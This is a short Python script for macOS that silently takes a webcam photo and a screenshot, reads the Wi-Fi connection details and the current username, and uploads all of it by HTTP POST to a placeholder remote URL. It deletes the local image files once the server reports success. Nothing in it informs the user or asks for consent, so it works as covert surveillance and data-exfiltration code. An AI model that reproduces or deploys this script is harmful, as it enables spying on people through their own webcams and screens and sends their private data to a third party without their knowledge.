#!/usr/bin/python
## Author: Karthikeya Udupa K M

import cv
import time
import requests
import os
import json
from subprocess import check_output

url = 'http://testurl.here.com'

capture = cv.CaptureFromCAM(0)
img = cv.QueryFrame(capture)


current_camera_filename = "CAM_"+str(time.time())+".png"
current_screen_filename = "SCR_"+str(time.time())+".png"
cv.SaveImage(current_camera_filename,img)
del(capture)

wifi_info = check_output(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport','-I'], shell=False)
username = check_output(['whoami'], shell=False)

payload = {'wifi_info': wifi_info, 'username': username}
os.system("screencapture ./"+current_screen_filename)

response = requests.post(url,
                         params=payload,
                         files={'screenshot': open(current_screen_filename,'rb'),
                                'camera'    : open(current_camera_filename,'rb')})

resonse_JSON_object = response.json()
if resonse_JSON_object['success']==True:
    print('Request Successful')
    os.remove(current_screen_filename)
    os.remove(current_camera_filename)
else:
    print('Request Unsuccessful')